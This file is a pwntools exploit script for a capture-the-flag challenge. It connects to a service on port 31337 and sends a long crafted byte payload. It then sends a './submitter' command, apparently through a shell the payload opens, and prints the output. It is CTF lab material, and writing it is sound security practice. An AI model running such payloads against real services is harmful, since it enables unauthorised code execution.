from pwn import *

var = os.getenv("DEBUGINFOD_URLS")

binary_name = "challenge.py"
# exe  = ELF(binary_name, checksec=True)
# context.binary = exe

ru  = lambda *x: r.recvuntil(*x)
rl  = lambda *x: r.recvline(*x)
rc  = lambda *x: r.recv(*x)
sla = lambda *x: r.sendlineafter(*x)
sa  = lambda *x: r.sendafter(*x)
sl  = lambda *x: r.sendline(*x)
sn  = lambda *x: r.send(*x)

if var is None:
    HOST = os.environ.get("HOST", "localhost")
    PORT = 31337
    r = connect(HOST, int(PORT))
elif args.GDB:
    r = gdb.debug(f"./{binary_name}", """
        c
    """, aslr=False)
else:
    r = process(f"./{binary_name}")

ez_win = b'\x00\x00\x00\x00\x00\x00\x01\x01\x01\x01\x05gV{[\x01uIjT\x06hW|\\\x02vJkZ\x07iX}]\x03wKl[\x08jY~^\x04xLm\\\tkZ\x7f_\x05yMn]\nl[\x80`\x06zNo^\x0bm\\\x81a\x07{Op_\x0cn]\x82b\x08|Pq`\ro^\x83c\t}Qra\x0ep_\x84d\n~Rsb\x0fq`\x85e\x0b\x7fStc\x10ra\x86f\x0c\x80Tud\x11sb\x87g\r\x81Uve\x12tc\x88h\x0e\x82Vwf\x13ud\x89i\x0f\x83Wxg\x14ve\x8aj\x10\x84Xyh\x15wf\x8bk\x11\x85Yzi\x16xg\x8cl\x12\x86Z{j\x17yh\x8dm\x13\x87[|k\x18zi\x8en\x14\x88\\}l\x19{j\x8fo\x15\x89]~m\x1a|k\x90p\x16\x8a^\x7fn\x1b}l\x91q\x17\x8b_\x80o\x1c~m\x92r\x18\x8c`\x81p\x1d\x7fn\x93s\x19\x8da\x82q\x1e\x80o\x94t\x1a\x8eb\x83r\x1f\x81p\x95u\x1b\x8fc\x84s \x82q\x96v\x1c\x90d\x85t!\x83r\x97w\x1d\x91e\x86u"\x84s\x98x\x1e\x92f\x87v#\x85t\x99y\x1f\x93g\x88w$\x86u\x9az \x94h\x89x%\x87v\x9b{!\x95i\x8ay&\x88w\x9c|"\x96j\x8bz\'\x89x\x9d}#\x97k\x8c{(\x8ay\x9e~$\x98l\x8d|)\x8bz\x9f\x7f%\x99m\x8e}*\x8c{\xa0\x80&\x9an\x8f~+\x8d|\xa1\x81\'\x9bo\x90\x7f,\x8e}\xa2\x82(\x9cp\x91\x80-\x8f~\xa3\x83)\x9dq\x92\x81.\x90\x7f\xa4\x84*\x9er\x93\x82/\x91\x80\xa5\x85+\x9fs\x94\x830\x92\x81\xa6\x86,\xa0t\x95\x841\x93\x82\xa7\x87-\xa1u\x96\x852\x94\x83\xa8\x88.\xa2v\x97\x863\x95\x84\xa9\x89/\xa3w\x98\x874\x96\x85\xaa\x8a0\xa4x\x99\x885\x97\x86\xab\x8b1\xa5y\x9a\x896\x98\x87\xac\x8c2\xa6z\x9b\x8a7\x99\x88\xad\x8d3\xa7{\x9c\x8b8\x9a\x89\xae\x8e4\xa8|\x9d\x8c9\x9b\x8a\xaf\x8f5\xa9}\x9e\x8d:\x9c\x8b\xb0\x906\xaa~\x9f\x8e;\x9d\x8c\xb1\x917\xab\x7f\xa0\x8f<\x9e\x8d\xb2\x928\xac\x80\xa1\x90=\x9f\x8e\xb3\x939\xad\x81\xa2\x91>\xa0\x8f\xb4\x94:\xae\x82\xa3\x92?\xa1\x90\xb5\x95;\xaf\x83\xa4\x93@\xa2\x91\xb6\x96<\xb0\x84\xa5\x94A\xa3\x92\xb7\x97=\xb1\x85\xa6\x95B\xa4\x93\xb8\x98>\xb2\x86\xa7\x96C\xa5\x94\xb9\x99?\xb3\x87\xa8\x97D\xa6\x95\xba\x9a@\xb4\x88\xa9\x98E\xa7\x96\xbb\x9bA\xb5\x89\xaa\x99F\xa8\x97\xbc\x9cB\xb6\x8a\xab\x9aG\xa9\x98\xbd\x9dC\xb7\x8b\xac\x9bH\xaa\x99\xbe\x9eD\xb8\x8c\xad\x9cI\xab\x9a\xbf\x9fE\xb9\x8d\xae\x9dJ\xac\x9b\xc0\xa0F\xba\x8e\xaf\x9eK\xad\x9c\xc1\xa1G\xbb\x8f\xb0\x9fL\xae\x9d\xc2\xa2H\xbc\x90\xb1\xa0M\xaf\x9e\xc3\xa3I\xbd\x91\xb2\xa1N\xb0\x9f\xc4\xa4J\xbe\x92\xb3\xa2O\xb1\xa0\xc5\xa5K\xbf\x93\xb4\xa3P\xb2\xa1\xc6\xa6L\xc0\x94\xb5\xa4Q\xb3\xa2\xc7\xa7M\xc1\x95\xb6\xa5R\xb4\xa3\xc8\xa8N\xc2\x96\xb7\xa6S\xb5\xa4\xc9\xa9O\xc3\x97\xb8\xa7T\xb6\xa5\xca\xaaP\xc4\x98\xb9\xa8U\xb7\xa6\xcb\xabQ\xc5\x99\xba\xa9V\xb8\xa7\xcc\xacR\xc6\x9a\xbb\xaaW\xb9\xa8\xcd\xadS\xc7\x9b\xbc\xabX\xba\xa9\xce\xaeT\xc8\x9c\xbd\xacY\xbb\xaa\xcf\xafU\xc9\x9d\xbe\xadZ\xbc\xab\xd0\xb0V\xca\x9e\xbf\xae[\xbd\xac\xd1\xb1W\xcb\x9f\xc0\xaf\\\xbe\xad\xd2\xb2X\xcc\xa0\xc1\xb0]\xbf\xae\xd3\xb3Y\xcd\xa1\xc2\xb1^\xc0\xaf\xd4\xb4Z\xce\xa2\xc3\xb2_\xc1\xb0\xd5\xb5[\xcf\xa3\xc4\xb3`\xc2\xb1\xd6\xb6\\\xd0\xa4\xc5\xb4a\xc3\xb2\xd7\xb7]\xd1\xa5\xc6\xb5b\xc4\xb3\xd8\xb8^\xd2\xa6\xc7\xb6c\xc5\xb4\xd9\xb9_\xd3\xa7\xc8\xb7d\xc6\xb5\xda\xba`\xd4\xa8\xc9\xb8e\xc7\xb6\xdb\xbba\xd5\xa9\xca\xb9f\xc8\xb7\xdc\xbcb\xd6\xaa\xcb\xba\xa3ccccc\x94\x96\x96\x9a'
rl()
sl(ez_win)

sleep(0.5)
print(r.clean()[-300:])
try:
	r.sendline(b'./submitter')
except:
	pass
print(r.recvall(timeout=1)[-300:])




# r.interactive()
# after shell xd
